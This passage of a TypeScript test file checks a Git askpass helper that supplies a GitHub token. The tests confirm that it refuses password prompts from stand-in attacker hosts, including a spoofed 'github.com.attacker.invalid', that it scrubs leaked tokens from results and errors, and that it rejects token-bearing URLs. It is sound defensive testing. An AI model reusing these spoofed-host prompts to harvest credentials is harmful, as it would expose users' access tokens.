    const dispose = vi.fn(async () => undefined);

    await expect(
      runApprovedHostGit(args, {
        cwd: workspace,
        token,
        git,
        createAskpass: async () => ({ path: '/askpass', dispose }),
      }),
    ).resolves.toEqual(gitResult());
    expect(git).toHaveBeenCalledOnce();
    expect(dispose).toHaveBeenCalledOnce();
  });

  it('creates a production 0700 token-free askpass helper and disposes it after success', async () => {
    const helperPaths: string[] = [];
    const observations: Array<{
      mode: number;
      containsToken: boolean;
      username: string;
      passwordDigest: string;
      untrustedExitCode: number | null;
      untrustedOutputLength: number;
      spoofedHostExitCode: number | null;
      spoofedHostOutputLength: number;
    }> = [];
    const git = vi.fn<GitTransport>(async (_args, options) => {
      const helperPath = options.env.GIT_ASKPASS;
      if (!helperPath) return gitResult();
      helperPaths.push(helperPath);
      const [body, helperStats] = await Promise.all([
        fs.promises.readFile(helperPath, 'utf8'),
        fs.promises.stat(helperPath),
      ]);
      const username = spawnSync(
        helperPath,
        ["Username for 'https://github.com':"],
        { env: options.env, encoding: 'utf8' },
      );
      const password = spawnSync(
        helperPath,
        ["Password for 'https://x-access-token@github.com':"],
        { env: options.env, encoding: 'utf8' },
      );
      const untrusted = spawnSync(
        helperPath,
        ["Password for 'https://attacker.invalid':"],
        { env: options.env, encoding: 'utf8' },
      );
      const spoofedHost = spawnSync(
        helperPath,
        ["Password for 'https://github.com.attacker.invalid':"],
        { env: options.env, encoding: 'utf8' },
      );
      observations.push({
        mode: helperStats.mode & 0o777,
        containsToken: body.includes(token),
        username: username.stdout.trim(),
        passwordDigest: createHash('sha256')
          .update(password.stdout.trim())
          .digest('hex'),
        untrustedExitCode: untrusted.status,
        untrustedOutputLength: untrusted.stdout.length,
        spoofedHostExitCode: spoofedHost.status,
        spoofedHostOutputLength: spoofedHost.stdout.length,
      });
      return gitResult();
    });
    const deps = baseDeps({ git });
    deps.createAskpass = undefined as never;

    await prepareCodingWorkspace(firstRunInput, deps);

    expect(observations).toHaveLength(2);
    expect(observations).toEqual(
      Array.from({ length: 2 }, () => ({
        mode: 0o700,
        containsToken: false,
        username: 'x-access-token',
        passwordDigest: createHash('sha256').update(token).digest('hex'),
        untrustedExitCode: 1,
        untrustedOutputLength: 0,
        spoofedHostExitCode: 1,
        spoofedHostOutputLength: 0,
      })),
    );
    for (const helperPath of helperPaths) {
      await expect(fs.promises.access(helperPath)).rejects.toThrow();
    }
  });

  it('disposes the production askpass helper when credentialed Git fails', async () => {
    let helperPath: string | undefined;
    const git = vi.fn<GitTransport>(async (_args, options) => {
      helperPath = options.env.GIT_ASKPASS;
      throw new Error('fake transport failure');
    });
    const deps = baseDeps({ git });
    deps.createAskpass = undefined as never;

    await expect(prepareCodingWorkspace(firstRunInput, deps)).rejects.toThrow(
      /approved Git operation failed/i,
    );

    expect(helperPath).toBeTruthy();
    await expect(fs.promises.access(helperPath!)).rejects.toThrow();
  });

  it('removes the token from remote results and thrown errors', async () => {
    const dispose = vi.fn(async () => undefined);
    const createAskpass = vi.fn(async () => ({ path: '/askpass', dispose }));
    const leakingResultGit = vi.fn<GitTransport>(async () =>
      gitResult(
        `url=https://x-access-token:${token}@github.com/owner/repo.git`,
        token,
        1,
      ),
    );

    const result = await runApprovedHostGit(
      ['fetch', 'origin', 'main', '--depth', '50'],
      {
        token,
        git: leakingResultGit,
        createAskpass,
      },
    );

    expect(JSON.stringify(result)).not.toContain(token);
    expect(dispose).toHaveBeenCalledOnce();

    const throwingGit = vi.fn<GitTransport>(async () => {
      throw new Error(`transport leaked ${token}`);
    });
    await expect(
      runApprovedHostGit(
        ['push', 'https://github.com/owner/repo.git', 'main'],
        {
          token,
          git: throwingGit,
          createAskpass,
        },
      ),
    ).rejects.not.toThrow(token);
    expect(dispose).toHaveBeenCalledTimes(2);
  });

  it('rejects token-bearing arguments before creating askpass', async () => {
    const git = vi.fn<GitTransport>();
    const createAskpass = vi.fn();

    await expect(
      runApprovedHostGit(
        ['clone', `https://${token}@github.com/owner/repo.git`],
        {
          token,
          git,
          createAskpass,
        },
      ),
    ).rejects.toThrow(/credential/i);
    expect(createAskpass).not.toHaveBeenCalled();
    expect(git).not.toHaveBeenCalled();
  });

  it('exports validators for canonical repository and branch identities', () => {
    expect(() => validateCodingRepoSlug('owner/repo')).not.toThrow();
    expect(() => validateCodingRepoSlug('./repo')).toThrow(/repository slug/i);
    expect(() => validateCodingBranch('feature/safe-name')).not.toThrow();
    expect(() => validateCodingBranch('feature/./name')).toThrow(/branch/i);
  });
});
